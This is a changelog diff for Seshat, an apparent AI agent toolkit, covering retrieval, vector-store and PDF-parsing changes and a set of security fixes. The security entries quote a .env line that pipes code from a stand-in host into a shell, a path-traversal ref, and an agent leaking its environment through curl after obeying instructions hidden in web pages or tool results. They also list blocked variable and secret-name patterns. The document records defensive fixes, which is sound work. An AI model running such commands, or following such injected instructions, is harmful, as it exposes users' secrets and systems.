@@ -9,7 +9,258 @@ Versioning: [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+### Security
+
+- **The terminal UI no longer applies the executable parts of a project's configuration until the project is trusted.** `.seshat.json`, `seshat.json` (from the working directory up to the git root) and `.seshat/seshat.json` are merged into the configuration, and a repository that was just cloned can carry any of them: a test loads one with an MCP server in stdio mode, a hook, an LSP server, a provider with a `base_url` and an `api_key` written `$(...)`, `permissions.allowed_tools` and extra context paths, and all of it was applied, so opening Seshat in the folder started the command (nothing asked). Now `mcp`/`mcpServers`, `hooks`, `lsp`, `providers`, `permissions`, `image_generation`, `text_to_speech`, `speech_to_text`, `options.context_paths` and `options.skills_paths` of a project file are ignored unless the user ran **`seshat trust`** in the project (`--status` to see, `--untrust` to withdraw). The trust is recorded for the SHA-256 of each file, so a file that changes has to be trusted again; a setting changed through the interface keeps a trusted file trusted and does not trust a file that came with the repository. The interface warns at startup when something was ignored. The user's own configuration, in the runtime root, is never restricted. See `docs/project-trust.md`.
+- **A `.env` file in the working directory can no longer run a command or redirect Seshat.** `Load` reads `.env` from the directory Seshat is started in, which can be a repository that was just cloned, and `ExpandShellValues` runs any `$(...)` found in the configuration: a `.env` holding `SESHAT_API_KEY=$(curl evil.example | sh)` ran that command when the configuration was loaded, before any prompt (shown by a test that makes the command write a file). A `.env` entry is now ignored, with a warning on the standard error output, when its value holds a shell substitution (`$(...)` or a backquote) or when its name is one that decides what is run or where Seshat looks for its configuration or how closed its commands are: `PATH`, `SHELL`, `HOME`, `LD_*`, `DYLD_*`, `GIT_*`, `PYTHON*`, `PERL*`, `NODE_OPTIONS`, `BASH_ENV`, `EDITOR`, `NPM_CONFIG_*`, `SESHAT_RUNTIME_ROOT`, `SESHAT_BASH_*`, `SESHAT_GRPC_ALLOW_*`, `SESHAT_GRPC_AUTH_*` and `SESHAT_GRPC_TLS_*`. They still work from the real environment and from the user's own configuration file. Keys, models and URLs in a `.env` are unchanged. Found by triaging the `gosec` report.
+- **A `HEAD` file can no longer make `ReadGitHead` read another file.** The ref named by `ref: ...` was joined to the git directory without a check, so `ref: refs/heads/../../../secret` made the first line of any file readable as a commit id. A ref must now be a name under `refs/` (no `..`, no absolute path, no backslash or drive letter) and is read through `os.Root`. The two walks that read files found on the way (the validator of skills and the search of office files in a session directory) read them through `os.Root` too and skip symlinks.
+- **`gosec` blocks the build on a new finding of high severity** (medium confidence or better), pinned to v2.29.0, and `govulncheck` is pinned to v1.8.0 (they were `@master` and `@latest`). The `gosec` step was in fact analysing nothing: the Docker action ships a Go older than the 1.26.6 of `go.mod`, could not load a single package and reported "Issues: 0", which the report-only mode hid; it is now built and run with the Go of the job, and a failure to load packages fails the step. Of the 75 high-severity findings of the first scan, 10 were fixed or accepted one by one with a `#nosec <rule> -- reason` on the line (three goroutines that outlive their request on purpose, the hook and `$(...)` commands that come from the user's own configuration, two reads in the worktree resolution of `.git`), and four classes judged false positives for this code base are excluded in the workflow with the reason of each (`G101`, `G404`, `G115`, `G704`).
+- **A command the model runs no longer inherits the secrets of the process.** The `bash` tool (foreground, background and `monitor`), the local sandbox executor and the shell of the terminal UI gave every command the whole environment of Seshat, provider keys, database and cloud credentials included, so `env`, or `curl -d "$(env)" ...` obeying an instruction hidden in a web page, a tool result or a file of the repository, could send them out. The new `internal/envfilter` takes out the variables whose name says secret (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `*_DSN`, `DATABASE_URL`...), the families of the providers Seshat talks to and the ones whose value is plainly a credential (a URL with a password, a private key, the usual token prefixes); `PATH`, `HOME`, the locale, the proxies and the build settings stay (`SSH_AUTH_SOCK` too, for git over SSH). `SESHAT_BASH_ENV_ALLOW=NAME,PREFIX_*` keeps variables that look like secrets (a command that needs `GITHUB_TOKEN`), `SESHAT_BASH_INHERIT_ENV=true` restores the old behaviour. The Docker sandbox never forwarded the environment. Variables given by a call itself still pass. Found in an audit of the repository.
+- **`cmd/grpc` is closed by default.** It listened on every interface (`:50051`), with no authentication and no TLS, and `ConnectMCP` took a `command`, `args` and `env` and started that process on the host (and saved it in the user's MCP configuration, so it came back at the next start): anyone who could reach the port could run commands as the user of the server, and spend its provider keys through `Query`. Now: it listens on `127.0.0.1` unless `SESHAT_GRPC_HOST` says otherwise; on any other address it refuses to start without `SESHAT_GRPC_AUTH_TOKEN` (or `SESHAT_GRPC_ALLOW_INSECURE_REMOTE=true`); with a token, every call but `HealthCheck` needs `authorization: Bearer <token>` (compared in constant time); `SESHAT_GRPC_TLS_CERT` and `SESHAT_GRPC_TLS_KEY` turn TLS on; and `ConnectMCP` refuses a stdio server (`PermissionDenied`) unless `SESHAT_GRPC_ALLOW_STDIO_MCP=true`. **Breaking for a deployment that reached the server from outside its host or container**: set `SESHAT_GRPC_HOST=0.0.0.0` and a token (see `docs/transports.md`); one that calls `ConnectMCP` with a stdio server must set `SESHAT_GRPC_ALLOW_STDIO_MCP=true`. Found in an audit of the repository.
+
+### Changed
+
+- **The gRPC contract says what it is.** `seshat.proto` no longer declares `FileService` and `SystemService` (with its `Bash` RPC): they were never implemented in `cmd/grpc` and nothing in the repository used them, so a client generated from the file got stubs that always failed. `QueryRequest.stream` and `QueryRequest.temperature` are marked `deprecated` (the server ignores both). The file now states that the surface is experimental and partial (`SeshatService` only: `Query`, `QueryStream`, `ConnectMCP`, `GetModels`, `HealthCheck`). Generated code regenerated with protoc 34.1, protoc-gen-go v1.36.11 and protoc-gen-go-grpc v1.6.1.
+- **The reranker is not asked when the first stage is sure** (`Service.SetRerankMargin`, `RAG_RERANK_MARGIN`, 0.2 by default; 0 asks it for every search): when the best chunk beats the second by at least that share of its own score, the retrieval order stands. On the SeshatCloud benchmark this lost nothing (MRR 0.902 with and without on the 192 single-fact questions, 0.421 against 0.425 on the 49 multi-passage ones) and saved 24% and 8% of the (question, chunk) pairs a cross-encoder reads. Deeper savings (a pool of 5, a margin of 0.05 to 0.1, cheap lexical features) did not hold on the multi-passage questions and are not used. With no reranker configured nothing changes.
+
+### Changed
+
+- **Reranking defaults, measured** (retrieval benchmark of SeshatCloud: 192 questions on 19 documents, bge-m3 + BM25 as first stage, three cross-encoders; see `docs/rag.md`). The blend weight stays at 0.7, and now with a measure behind it: the best weight depends on the reranker (0.5 for the small mMARCO MiniLM 118M and bge-reranker-base 278M, where the reranker alone gained nothing; indifferent for bge-reranker-v2-m3; 1.0 for Cohere rerank-v3.5), and against the best weight of each of the five rerankers measured 0.7 never loses more than 0.012 of MRR, where 0.5 loses up to 0.019 and 1.0 up to 0.020. The pool is `max(topK, 10)` chunks instead of `max(3 x topK, 20)`: 20 was not better than 10 for any model and costs twice the time. The reranker is now asked for the whole pool and its scores are normalised over the whole pool, then the list is cut to `topK` (it was asked for `topK` only, so the normalisation, and with it the blend, depended on which few chunks came back). bge-reranker-v2-m3 moves the answering chunk up by 0.094 of MRR [+0.054, +0.137] and hit@1 from 0.71 to 0.87; the small ones by 0.03 to 0.04.
+- A reranker that fails now logs a warning ("keeping the retrieval order") instead of falling back silently.
+
+## [1.2.73] - 2026-10-05
+
+### Changed
+
+- **The HNSW store has its own graph** (`internal/vector/hnsw_index.go`), in place of `github.com/coder/hnsw`. That library stops its search as soon as a step finds nothing closer, so `efSearch` only bounded a queue and the search was greedy: measured against an exact search it found 8% of the true ten nearest neighbours of 2,000 random vectors and 2% of 20,000, whatever `efSearch` (20 to 200) and `M` (16 or 32), and 35% / 17% on clustered vectors. The new graph is the algorithm of the paper (search until no candidate is closer than the worst of the `efSearch` best, neighbours chosen for their spread): 1.00 on clustered vectors and 0.99 on random ones at 3,000 vectors, 0.998 on 20,000 clustered ones (0.63 on 20,000 random ones with `efSearch` 64, 0.91 with 512, the hardest case: random vectors have no structure to follow). A removed or replaced vector is a tombstone until more than half the graph is tombstones, then the graph is rebuilt. A metadata filter on a search now asks the graph for five times more hits, so that some are left after the filter.
+- **The HNSW store works on Windows** (the old library did not build there): `vector.StoreHNSW` and the CLI use it. An install that ran before, with its corpus in the SQLite fallback file and no HNSW file, keeps using SQLite until that file is emptied, so its corpus is still read.
+- A graph file written by an older version (the `coder/hnsw` format) is read once, rebuilt from its vectors in the new format, and kept as `<namespace>.hnsw.legacy` (Linux and macOS; on Windows no such file exists).
+- **Qdrant and Chroma honour `HybridWeight`** (they ignored it). Neither can rank by words, so the keyword side is one lookup per word of the query (16 at most, run together): a document scores the sum of the weights of the query words it holds, a rarer word weighing more, and the result is blended with the vector hits as in every other store. Qdrant creates a full text index on `_text` for the collection on the first hybrid search; Chroma matches each word with a case-insensitive whole-word regular expression, which it evaluates on every document of the collection, so its keyword side costs a scan per word.
+- **pgvector**: a query for more than 40 vector candidates (every hybrid search) runs with `hnsw.ef_search` raised to the number asked, up to 1000: an HNSW index returned at most 40 rows whatever the `LIMIT`. On 20,000 random vectors this took the hybrid hit rate of the store from 0.21 to 0.42.
+
 ### Added
+
+- `TestStoreSpeed` (`internal/vector/speed_test.go`, runs only with `VECTOR_SPEED=1`): ingestion time, median and 95th percentile latency of a vector and of a hybrid search, and hit rate, for every store on the same synthetic collection. Integration tests of the hybrid search for Qdrant (`QDRANT_INTEGRATION_ADDR`) and Chroma (`CHROMA_INTEGRATION_URL`).
+
+### Fixed
+
+- **pgvector**: a search with a metadata filter failed (`could not determine data type of parameter`): the placeholders of the filter were numbered one too high. The pgvector tests had never run in CI (they skip without a database); the Test job now starts a `pgvector/pgvector:pg17` service, and a new test covers the hybrid search on a real database (words only the keyword side matches, the filter on both sides, the `text_search` index, a table created before the column existed).
+- `TestDockerExecutorCloseRemovesContainers` waits for the removal (up to 30 s) instead of checking at once: `docker stop` returns before `--rm` has removed the container, and on a busy machine the test failed.
+
+## [1.2.72] - 2026-10-05
+
+### Changed
+
+- Hybrid search blends the same way in every vector store, and finds what only the words match. The stores read `topK` or `2 x topK` hits of each ranking and blended the vector ones with keyword scores that were not normalised (pgvector added a raw `ts_rank` to a cosine; SQLite and HNSW only boosted hits the vectors had already found; the memory store ignored the weight). Each ranking is now read to `max(100, 10 x topK)` candidates (500 at most), divided by its best score, weighted `1 - HybridWeight` and `HybridWeight` and added (`blendHybrid`), so a chunk the vectors rank far down but the words match is found. Measured on the SeshatOS retrieval benchmark (192 questions, 19 documents, bge-m3): 100 candidates instead of 20 find the answer among the first five results 3 to 4 points more often at 512 and 768 token chunks, and blending scores instead of ranks adds 0.04 to 0.05 of MRR there. No change at 256 token chunks, and none on the 49 questions that need several passages; how the scores are normalised (best score, min-max, z-score) made no difference beyond the noise.
+- **pgvector**: the keyword side reads a `text_search` column, a `tsvector` the database keeps from `text` (PostgreSQL 12 or later, added to an existing table on startup), with a GIN index, instead of parsing the text of every row of the collection at each query, and joins the words of the query by OR. `PgVectorOptions.TextSearchConfig` chooses the text search configuration (`simple` by default). A failing keyword query is an error: it fell back to a pure vector search without a word.
+- The memory store honours `HybridWeight` (it ignored it). Chroma and Qdrant still ignore it; `vector.Query` says so.
+
+### Added
+
+- `TestDumpChunksForEvaluation` accepts `heading<N>o<M>` as a strategy name: chunks of N tokens with an overlap of M (`heading512o0`: none), to measure what an overlap is worth.
+
+## [1.2.71] - 2026-10-05
+
+### Fixed
+
+- A table whose rules between columns are drawn only in its heading no longer writes the same text in each of the columns of a merged cell. The FOMC projections draw the rules between 2024, 2025 and 2026 in the band of the years and none in the body, so the three figures of a row ("2.1 2.0 2.0") were one wide cell, written three times. A ruling that does not cover a row now still separates two cells of it when the cell it would merge holds text on both sides of it and none runs across; a single block of text over the ruling stays a merged cell. In a table whose rows are not bounded by rules, the second line of a heading over a column of figures ("Longer" over "run") carries on the first, since no column is a column of figures above the first row that has one (a year is not a figure).
+
+## [1.2.70] - 2026-10-04
+
+### Fixed
+
+- A page of a PDF that is shown rotated (`/Rotate 90`, `180` or `270`, a landscape table in a portrait document) is read in the orientation it is shown in. Its text, drawn through a rotated matrix, came out with a size and an advance of zero and one glyph per line ("F", "o", "r", ...: 782 lines of one letter in the FOMC projections, 1286 paragraphs for 59 once read properly); the rulings are turned too, so a rotated table is found as a table. The size and the advance of each glyph are restored from the font's width table, or from the proportions of Helvetica when the file has none.
+- A paper set in two columns is read as paragraphs. The right edge of the text was one number for the whole page, so each line of the left column "stopped far short of the edge" and was taken for a list of short lines: every line kept its break and a word hyphenated at a line end was never joined (BERT: 156 hyphens at line ends and 474 line breaks inside paragraphs, now 31 and 92). Pages with two columns now have a margin and an edge per column.
+- A word broken at a line end keeps its hyphen when the page writes it that way elsewhere ("task-specific", "pre-trained"), and has no hyphen otherwise ("approximation"). A compound broken at its own hyphen ("English-" then "to-German") no longer gets a space after it.
+- Ligatures are not lost any more. A font that names its ligature glyphs by their parts (`f_i`, `f_f_i`, `f_l`: Linux Libertine, most fonts made with FontForge) gave a control character that was dropped, so "files" was read as "les", "financial" as "nancial" and "efficiency" as "ecency" (132 in the LayoutLM paper); the names are read from the font and written as letters. The ligature characters of Unicode (U+FB00 to U+FB06, "ﬁ", "ﬂ") are written as the letters they stand for, since "ﬁne-tuning" is not found by a search for "fine-tuning".
+- The control characters of a symbol font (bullets and check marks with no Unicode value, 232 in an IBM Redpaper) are dropped from the text.
+
+## [1.2.69] - 2026-10-04
+
+### Fixed
+
+- A PDF page with no text at all (a cover, a blank page, a full-page picture) no longer makes the whole document unreadable when no engine and no vision model is configured: one such page failed 3 of the 13 PDFs of the chunking benchmark corpus (a book of 60 pages, a deck of 25, a report of 18). The page is kept as it is, with a marker for each picture it holds (`[Image 1 on page 7]`), or empty when it holds none. A PDF none of whose pages has text (a scan) is still "nothing extracted", and so is any document when an engine is configured and does not answer: that must not leave a hole nobody sees.
+
+## [1.2.68] - 2026-10-04
+
+### Added
+
+- `rag.HeadingChunker` and `rag.NewHeadingChunker` in the public SDK (`pkg/rag`): the markdown chunker hosts use for documents they read natively (headings, paragraphs, lists, tables and code cut along their structure, `heading_path` and `page_numbers` metadata) can be used directly, without going through `NewHybridDocumentChunkerForProfile` and its fallback.
+- `TestDumpChunksForEvaluation` (`internal/rag`, does nothing unless `MD_DIR`, `DOCS`, `STRATS` and `OUT` are set): writes the chunks of markdown documents for the retrieval benchmark of seshat-intelligence (`benchmarks/chunk_bench` in SeshatOS), which asks whether the chunk that answers a question is among the first results. `STRATS` names the chunkers (`profile` for the default structured profile, `paragraph`, `heading<N>` for chunks of N tokens); `LABEL` is put before each name to tell the chunks of an older checkout from these.
+
+### Fixed
+
+- A PDF page that has text and a picture is read when no engine or OCR is there to read the picture, instead of failing the whole document. `pdfsmart.Convert` sent every page with a raster image to the engine, so with none configured a paper with a single figure was "nothing extracted" (11 of 13 PDFs of the chunking benchmark corpus). The page keeps its text, and ends with a marker for each picture worth one: `[Image 2 on page 4: Figure 2. Residual learning]`, or `[Image 2 on page 4]` when no caption could be attached (a caption is attached only when the page has as many "Figure N" lines as pictures). Icons under 100 pixels and a picture used on three pages or more (a logo, a letterhead) get no marker. The number counts the pictures of the page, so with the page number it names the picture whatever pages were read, for a host that later gives a multimodal model a way to look at the page itself. `pdfsmart.PageResult.Pictures`, `pdfsmart.Picture`, `pdfsmart.ImageMarker`. A page with no text at all (a scan) is still a failure without an engine, and a page an engine reads has no marker.
+
+## [1.2.67] - 2026-10-04
+
+### Added
+
+- `documentreader.GenericConfig.ChunkFields`: a host maps the `ChunkOptions` of a chunk call (the size the chunks should have) onto the form fields its server's chunk endpoint takes. `GenericClient.ChunkHybridBytes` and `ChunkHybridFile` used to ignore the options (a server that is not docling-serve has no common names for them); without the mapping nothing changes.
+
+## [1.2.66] - 2026-10-04
+
+### Changed
+
+- `HeadingChunker` and `TableChunker` read markdown as blocks (headings, paragraphs, lists, tables, fenced code) and cut it along them. Measured on 172 documents read by the native readers: chunks under 40 tokens fall from 48% to 8%, tables cut without their header from 75 of 295 to none, chunks over the limit from 123 to none, and the 2.6% of the text that was in no chunk (the items of a numbered list, taken for headings) is no longer lost. A paragraph is cut between sentences with an overlap, a table between rows with its header repeated, code between lines with each piece fenced again; small sections are joined with their headings written in the text; the heading path is clean (no `#` marks). Code comments are not headings and a numbered list is not a series of headings; Portuguese, Spanish, German, Italian and Dutch structural words are recognised. A heading with nothing under it is kept as text when no sub-heading follows it.
+- The `structured` chunk profile is 512 tokens with an overlap of 64 (it was 1024 with 120): chunks of 1024 tokens held several topics.
+
+### Added
+
+- Chunks say which pages they come from. A PDF read page by page has, in the text that is indexed, a marker line (`<!-- page 3 -->`, an HTML comment that rendering hides) before each page: `documentreading.Result.PagedMarkdown` (and `Result.TextForIndexing()`, which gives it for a PDF and `Markdown` for every other format; `Markdown` itself stays clean for anyone who shows the text). `HeadingChunker` and `TableChunker` take the markers out of the text and put the pages a chunk covers in `Metadata["page_numbers"]` (`[3,4]`, as document readers give them); the other chunkers drop the markers. `documentreading.StripPageMarkers` for a host that needs the text clean.
+- `testdata/chunking` and `TestChunkQuality`: the chunkers are held to measures (no lost word, no table piece without its header, no unbalanced fence, no chunk over the limit, few tiny chunks) on real reader output; `RAG_CHUNK_CORPUS` runs them on a bigger corpus.
+
+## [1.2.65] - 2026-10-04
+
+### Fixed
+
+- Reading a long document with the layout models took minutes for nothing: on a 60-page book almost every page "looked like it might hold a table" and was put to the models, 160 s instead of 4.6 s with the same text. A page with code, formulas or two columns of running text no longer looks columnar, and the time one document may spend on the models is bounded (`pdfsmart.Options.ModelBudget`, 20 s by default, shared by every page of a document, also the pages read through the engine). `pdfsmart.Result.ModelPagesSkipped` and a note in the Read result say when pages were left without the models (their text is complete; the tables found from the rulings stay).
+- A deck that is mostly pictures (a title or two of real text) gave an error, or "nothing could be read", when no reader could do better than the native extractor: its text was extracted and thrown away. `documentreading.Convert`/`ConvertBytes` and the Read tool now return that thin text (the Read tool says it is thin). A file that parsed and has no text at all is "nothing extracted", not the error of a reader that does not know the format.
+- The Read tool had no size limit for converted documents (DOCX, PPTX, XLSX): a big one went into the context whole. They are now read in pieces of about 120,000 characters, with `offset`/`limit` counting lines of the markdown and a note saying where to continue.
+
+### Removed
+
+- Code that nothing called: `read/cancellation.go` (all but `ReadFileInRange` and `CountFileLines`), `EstimateImageTokens`, `GetImageDimensions`, `IsTextByExtension`, `IsImageByExtension`, `GetCanonicalName`, `InvalidateFileCache` and three cache methods, `pdfsmart.Result.DoclingPageCount`/`VisionPageCount`, two helpers of `officetext`, and the second plain-text layout of `pdftext` (`pdftext.Extract`, still public, now returns the markdown of the pages, as the Read tool does). The audio error no longer sends to a script that does not exist.
+
+### Changed
+
+- `read.DoclingExtensions` is now `read.DocumentReaderExtensions`.
+
+## [1.2.64] - 2026-10-04
+
+### Fixed
+
+- Converting a whole PDF with the native reader (ingestion, and any page a caller sends to the engine) wrote a page with a text layer as the plain text of the layer, with no table at all: the tables the Read tool shows (ruled, borderless, with one rule, or a picture) were lost on that path. Such a page is now written the way the page reader writes it. A page with only a few words over a picture is still read by OCR, as before.
+
+## [1.2.63] - 2026-10-04
+
+### Added
+
+- Encrypted PDFs are read. An AES-256 PDF (what Acrobat and most banks produce) or any PDF encrypted with an empty user password (an emailed statement whose owner password only limits printing and copying) used to be refused ("malformed PDF: 256-bit encryption key"); it is now decrypted into a plain copy, once, and read like any other, by every reader (the Read tool, `documentreading`, ingestion, the layout models). A PDF protected by a user password says so (`pdfsmart.ErrPasswordRequired`), and the Read tool has an optional `password` parameter for the password the user gives. Decryption is `github.com/razvandimescu/gopdf` (MIT, no dependencies; reads RC4, AES-128 and AES-256, whatever way the producer wrote the encryption dictionary) for an empty password, and `pdfcpu` when a password is given.
+- `pdfsmart.Unlock`, `pdfsmart.ErrPasswordRequired` and `pdfsmart.Options.Password`.
+- Tables that are pictures are read, when the native reader has its models. A table pasted into a text page as a screenshot (a picture at least 240 x 80 pixels) is found by the layout model, cut out of the page image, read by the OCR, and written as a markdown table where it sits in the page. A scanned page is read the same way: the table in it comes out as a table, not as lines of text. A table with text of its own on the page is still filled from that text, not from a picture of it. `PageOptions` (`Tables`, `LargeImage`), `TableStructure.Words` and `TableMarkdown`, in `internal/pdftext`.
+- Tables with a single rule, under their column titles, are read from the rulings alone. An invoice's lines (a row of underlined titles, then the items, no rule above or below) were left as a run of text unless the models were there; a row of at least three chunks just over a rule, with lines under it that run on without a gap, is now a table candidate, judged by the same guards as any ruled block (columns that line up, no paragraph cells, regular rows). On the test papers, the TableFormer paper goes from 1 table to the 4 Docling finds in its pages 4 and 7, and 60 pages of prose, letters and CVs gain no false table.
+
+### Fixed
+
+- The size of the pictures of a page was never read (pdfcpu leaves it empty when it extracts them raw); it is now read from each picture's header.
+
+## [1.2.62] - 2026-10-04
+
+### Added
+
+- Tables with no ruling lines are read too, when the native reader has its models (`layout.ort` and `tsr.ort`, already part of the nativedoc models). For a page whose text looks columnar (several lines with several chunks lined up in columns; a page of prose is never sent to the models) the page is rendered, the layout model finds where the tables are, the table-structure model reads their rows, columns and header, and the cells are filled from the page's own text, which is exact where an OCR of the picture is not. The columns also come from the gaps in the text, so a column the model merged with its neighbour is found again. The reader is asked through the new optional `pdfsmart.TableFinder` interface (the native `Converter` implements it, and so a host that already passes it as its document reader gets this with no other change); without the models, or when they fail, a page reads as before. Tables that are pictures inside the PDF are not read (there is no text to fill them with).
+- `PageMarkdownWith` and `TableStructure` in `internal/pdftext`, and `pdfsmart.TableFinder` / `pdfsmart.TableStructure` in the public package: a host with its own layout model implements `TableFinder`, and `pdfsmart` does the rest (`internal/pdftext` is not importable from outside, so the first two are not part of the SDK).
+
+### Changed
+
+- In a ruled table whose rules sit between groups of rows rather than between every row, each line with numbers is a row of its own: a line is joined to the one above it only when it carries on its words (the second line of a wrapped label) or fills columns the row above leaves empty (a heading drawn lower than its neighbours). Two-line headers ("TEDS" over "Complex") are joined into one header row.
+
+## [1.2.61] - 2026-10-03
+
+### Added
+
+- Tables in PDFs are read as tables, in pure Go, from the lines the page draws. The page's rulings (stroked lines and rectangle edges, and filled bars thin enough to be rules) are read from the content stream and two kinds of table are recognised: a grid (horizontal and vertical rules that cross; merged cells are resolved, and a header that spans columns or rows is joined into one header row) and a ruled block (a top rule, a header rule and a bottom rule, with no vertical lines, as in most papers; its columns are the white gaps in the text, taken from the body so a header wider than its column cannot hide them). A table stays where it was in the reading order, its text is not repeated outside it, and its cells come out as markdown. On the documents tried (arXiv papers, a technical report, an IBM Redbook) it finds the same tables as Docling's TableFormer page by page. A table with no rules at all is not found: it is left as text, because a borderless table and two columns of prose cannot be told apart reliably from the text alone.
+- What is not a table is rejected: the header and footer rules of a page, a cover page of headlines and captions (mixed sizes, paragraph cells), a boxed listing (monospaced font, brackets and operators as cells), and two rules with a caption or a sentence between them (a caption splits one set of equal rules into the tables above and below it).
+
+## [1.2.60] - 2026-10-03
+
+### Changed
+
+- Office files are read for what they say, not just their words. **DOCX**: headings are found from the style's outline level, so they work in every language (a French Word names its style "Titre 1"); bulleted and numbered lists keep their depth and the numbers Word writes from the list ("Article 3", "1.2", "(a)"), including numbered headings; tables resolve merged cells (a cell that spans rows or columns repeats its value, several header rows become one: "2024 / Sales"); hyperlinks, footnotes, the description of pictures, text boxes and code in a monospaced font are kept; headers and footers and tracked deletions are not. **PPTX**: nested bullets and numbered steps, tables with merges, charts as a table of the numbers behind them, SmartArt text, picture descriptions, groups, speaker notes and hidden slides; slide numbers, dates and footers are left out. **XLSX**: values as the workbook shows them, merged cells, a sheet with several blocks of data becomes several tables, a title line above a table becomes its caption, hidden sheets are skipped, and a sheet is cut at 2000 rows with a note saying how many were left.
+- Tables, whatever the file, are written the same way (`internal/mdtable`): markdown tables with empty rows and columns dropped, cells on one line (`<br>`, escaped pipes), and a table with one column written as lines.
+
+### Added
+
+- HTML pages are converted to markdown by the default reader (`.html`, `.htm`, `.xhtml`): headings, nested lists, tables with merged cells and captions, fenced code with its language, quotations, links, picture descriptions and definition lists, without scripts, styles, navigation, hidden elements and the usual site chrome (edit links, language menus, breadcrumbs). It honours the page's declared encoding. The Read tool is unchanged: it shows an HTML file as source.
+
+### Removed
+
+- The managed docling-serve: `seshat setup`, the `DOCUMENT_READER_URL=docling:auto` selector and the installer's Python step are gone, and so is `internal/python`. Nothing installs a Python environment for you any more. The built-in reader handles DOCX, PPTX, XLSX and PDFs with a text layer; for scans and complex layouts, run a document-reader service (seshat-intelligence) yourself and point `DOCUMENT_READER_URL` at it. `seshat doctor` now reports the built-in reader when no service is configured instead of warning about a missing venv.
+
+## [1.2.59] - 2026-10-03
+
+### Changed
+
+- A session has one directory, `workspaces/{id}/`, instead of two. Plans, pastes, screenshots, tool output and the session log used to live in `sessions/{id}/` next to the `workspaces/{id}/` that hosts such as seshat-backend use for the files of a session; they are now in the same place, so the files a user attaches and the files the agent writes are together and deleting a session removes them all. `runtimepath.SessionDir` and `SessionsDir` now point there, and the artifact store keys use the `workspaces/` prefix.
+- The permissions a session has been granted ("always allow this tool") moved from `sessions/{id}/permissions.json` to `data/permissions/{id}.json`. They stay outside the session directory on purpose: the agent can write inside it, and a grant it could edit is a grant it could give itself.
+
+### Added
+
+- `runtimepath.MigrateLegacySessionDirs` moves what older versions wrote under `sessions/{id}/` to the new places, never overwriting. The CLI runs it at start; hosts that embed the SDK call it once at start.
+- `runtimepath.RemoveSessionData` removes a session's directory and its grants. `Client.DeleteSession` calls it, so deleting a session no longer leaves its plans and grants behind: the old layout left a `sessions/{id}/` folder for every session that had ever used plan mode or asked for a permission.
+
+## [1.2.58] - 2026-10-03
+
+### Changed
+- `read_file` reads a PDF page by page, with a `--- page N ---` marker before each page. With no `pages` it reads from the start; with `pages` ("3", "10-20", "5-") those pages. A read is bounded by cost, not page count: it stops at a page boundary after 120,000 characters, or after sending 20 pages with no text layer to the document reader, and says which page to continue from. The result names the pages that hold images or have no readable text.
+- Only the pages a read returns are read, in batches of ten, and each is remembered per file (path, size, modification time), so the first read of a long document is quick and a page an engine had to read is never paid for twice.
+- `internal/pdfsmart` gains `ReadPages` (`Convert` for chosen pages, with options to leave pages with an image but good text to the native reader and to bound engine calls) and `PageCount`. `Convert` behaves as before.
+- Native PDF pages are read as markdown, not flat text. Typesetting gives the structure: a line much bigger than the body is a heading (`#` to `###`), lines in a monospace font are a fenced code block with their indentation and spacing restored column by column, bullets and numbers are list items, wrapped lines are one paragraph (a hyphen added at a line end is undone), dot leaders become "…", and a table of contents keeps one entry per line. Formulas are recognised by their math font and position: inline ones become `$...$` with `^{}` and `_{}`, display ones become `$$...$$` with `rac{}{}`, `egin{cases}` and sums with their bounds, read in drawing order because the x the PDF library gives is unreliable for many fonts. Symbols stay as the PDF has them (Unicode math letters). Fraction bars, roots and matrices are not drawn as glyphs and are not recognised; a formula that needs them comes out as its parts in reading order. Tables are not detected.
+
+### Fixed
+- Native PDF text had no spaces between words on many PDFs (LaTeX output among them), which draw each word separately and leave the space as a gap: a paragraph came back as one unbroken word, and line breaks were lost. Text is now rebuilt from the position of each glyph, restoring word spaces and lines, and an accent drawn as its own glyph is joined to its letter. This affects every reader built on it (`read_file`, `pdfsmart`, `pkg/documentreading`, `pkg/pdftext`).
+- The `pages` parameter of `read_file` was ignored on every text path (a pre-converted `.md` next to the file, native text, and the document reader), so only the raw-PDF fallback honoured it and an agent could not read a page range as text.
+
+### Removed
+- `read_file` no longer serves a pre-converted `<name>.md` next to a PDF, since that text cannot be split by page. DOCX, PPTX and XLSX still use it for now.
+- The 50-pages-per-request error of `read_file` for a PDF: the size limits above bound a read instead.
+
+## [1.2.57] - 2026-10-02
+
+### Added
+- `pkg/documentreading`: the engine's default document reader as a public package. `Convert` and `ConvertBytes` turn a file into markdown cheapest path first: DOCX, PPTX and XLSX natively, PDFs page by page (only pages with an image, almost no text, or garbled text go to an external converter), then an optional external converter for scans, audio and images, with garbled-output detection. A host with no converter configured still reads every native format. It was previously internal to SeshatOS's backend, which meant a server could not reuse it.
+
+### Documentation
+- `SECURITY.md` and `CODE_OF_CONDUCT.md` now name a contact address.
+
+### Removed
+- `cmd/slack-bot`, `cmd/automation` and `cmd/automation-server` (with `Dockerfile.automation` and their Makefile targets): development and test programs that no embedder used. The `pkg/automation` library and the automation agent tools are unchanged.
+
+## [1.2.56] - 2026-10-02
+
+### Fixed
+- Session title generation no longer returns an empty title with reasoning models: the title request now has a 512-token output budget (was 50, which a model's hidden reasoning could consume entirely), and a leading `</think>` block is stripped from the result.
+
+## [1.2.55] - 2026-09-30
+
+### Fixed
+- `render_document_page` (added in 1.2.54) now attaches the rendered page as a genuine image content block in a follow-up message instead of inlining it as a base64 data URI inside the tool result's text. The old form was never reconstructed into a real image by any provider adapter — the model received an opaque base64 blob instead of a viewable page — and was also liable to be corrupted by `MicroCompactor`'s character-based tool-result trimming on longer sessions. Renders over 8 MiB are now reported instead of attached, rather than silently ballooning the request.
+
+### Documentation
+- Added the `internal/tools/files/documentreader` tools (`convert_document`, `read_document_url`, `render_document_page`) to `docs/tools.md` — missing since `convert_document`/`read_document_url` were introduced, and never added for `render_document_page` in 1.2.54.
+
+## [1.2.54] - 2026-09-28
+
+### Added
+- `render_document_page`: a new built-in document-reader tool that renders a specific PDF page to an image data URI, so multimodal-capable agents can inspect diagrams, figures, scans, or visually dense pages instead of relying only on extracted markdown.
+- Local automatic session-title generation via `TitleGenerator`/`LocalTitleConfig`, with a no-server GGUF/Hugging Face path backed by a `llama.cpp`-compatible executable. Hosts can now dedicate a tiny local model to title generation while keeping the main chat model unchanged.
+- Document-read metadata now carries per-page visual hints (`visual_pages`) when PDFs contain embedded images/visual content, and `read_file` surfaces that metadata from sidecar caches.
+
+### Changed
+- Session title generation now prefers an injected local title generator, then falls back to the configured title provider/model, then to the main chat model.
+- `pdfsmart` page results now retain embedded-image detection metadata so downstream readers can decide when visual inspection may be useful.
+
